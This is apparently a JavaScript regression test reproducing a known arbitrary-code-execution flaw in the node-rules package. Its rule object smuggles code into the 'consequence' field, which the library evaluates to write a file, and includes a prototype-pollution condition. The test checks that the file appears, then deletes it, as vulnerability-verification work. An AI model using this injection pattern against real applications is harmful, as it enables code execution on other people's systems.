//https://security.snyk.io/vuln/SNYK-JS-NODERULES-560426
test("Arbitrary code execution in node-rules", () => {
  const fs = require("fs");
  const A = require("node-rules");
  const path = "./node-rules";

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  try {
    var rules = {
      condition: "{}.__proto__.toString = 222",
      consequence: "require(`fs`).writeFileSync(`node-rules`,``)",
    };
    var a = new A();
    a.fromJSON(rules);
  } catch (error) {}

  //checking that its created by after exploit.
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);

  fs.unlink(path, function (err) {}); //deleting the file after creation
});
